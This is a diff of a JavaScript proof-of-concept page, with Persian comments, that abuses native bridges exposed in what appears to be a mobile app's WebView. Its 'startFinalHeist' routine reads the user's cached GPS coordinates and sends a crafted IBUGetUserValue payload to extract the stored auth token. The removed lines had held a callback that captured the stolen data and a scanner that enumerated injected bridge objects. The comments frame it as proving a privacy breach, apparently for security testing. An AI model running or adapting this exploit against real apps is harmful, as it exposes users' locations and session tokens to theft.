@@ -1,66 +1,45 @@
 <script>
     function log(msg, critical = false) {
         var box = document.getElementById('logs');
-        var color = critical ? "#ff4757" : "#2ed573";
+        var color = critical ? "red" : "#0f0";
         box.innerHTML += "> <span style='color:"+color+"'>" + msg + "</span><br>";
     }
-
-    // این بخش بسیار مهم است: شنود تمام توابعی که اپلیکیشن ممکن است صدا بزند
-    window.H5_CALLBACK = function(data) {
-        log("CALLBACK RECEIVED: " + JSON.stringify(data), true);
-        alert("CRITICAL DATA STOLEN: " + JSON.stringify(data));
-    };
 
     function startFinalHeist() {
         log("Initiating Critical Data Extraction...");
 
-        // ۱. اکسپلویت لوکیشن
+        // ۱. اکسپلویت لوکیشن (اثبات نقض حریم خصوصی)
         if (window.Locate_a && window.Locate_a.getCachedLocationData) {
             var loc = window.Locate_a.getCachedLocationData();
             if (loc) {
-                log("PRIVACY BREACH: GPS coordinates found!");
+                log("PRIVACY BREACH: User Coordinates Found!");
+                // استخراج لاتیتود و لانگیتود بر اساس متد toJSONObjectForHybrid
                 log("LAT: " + loc.lat + " | LNG: " + loc.lng, true);
             }
         }
 
-        // ۲. اکسپلویت دیتابیس (ارسال دستور)
+        // ۲. اکسپلویت دیتابیس (فرمت صحیح فرمان برای H5URLCommand)
         if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+            // ایجاد آبجکت آرگومان که h5URLCommand آن را پارس می‌کند
+            // طبق کد شما، این کلاس از Command String مقدار bussiness و key را می‌کشد بیرون
             var payload = JSON.stringify({
                 "action": "IBUGetUserValue",
-                "arguments": { "bussiness": "common", "key": "token" },
-                "callback": "H5_CALLBACK" // نام تابعی که در بالا تعریف کردیم
+                "arguments": {
+                    "bussiness": "common",
+                    "key": "token"
+                }
             });
 
-            log("Executing IBUGetUserValue...");
-            window.IBUStorageV2_a.IBUGetUserValue(payload);
-            log("Payload sent. Waiting for async callback...");
+            log("Executing IBUGetUserValue with Payload...");
+            try {
+                // صدا کردن متد با رشته JSON
+                window.IBUStorageV2_a.IBUGetUserValue(payload);
+                log("Command sent. Check Burp Suite or Callback for response.");
+            } catch(e) {
+                log("Error: " + e.message, true);
+            }
         }
     }
 
-    // بخش اسکنر (بازگردانده شد تا بخش ۱ اسکریپت کار کند)
-    setTimeout(function() {
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        var cleanWindow = iframe.contentWindow;
-        var foundBridges = [];
-        var currentProps = Object.getOwnPropertyNames(window);
-        var cleanProps = Object.getOwnPropertyNames(cleanWindow);
-        
-        currentProps.forEach(function(key) {
-            if (cleanProps.indexOf(key) === -1) {
-                if (!['iframe', 'cleanWindow', 'log', 'startFinalHeist', 'H5_CALLBACK'].includes(key)) {
-                    foundBridges.push(key);
-                }
-            }
-        });
-        
-        var output = document.getElementById('bridges');
-        output.innerHTML = "";
-        foundBridges.forEach(function(bridge) {
-            output.innerHTML += "<li>[+] Exposed: <b>" + bridge + "</b></li>";
-        });
-        
-        startFinalHeist();
-    }, 1500);
+    setTimeout(startFinalHeist, 2000);
 </script>
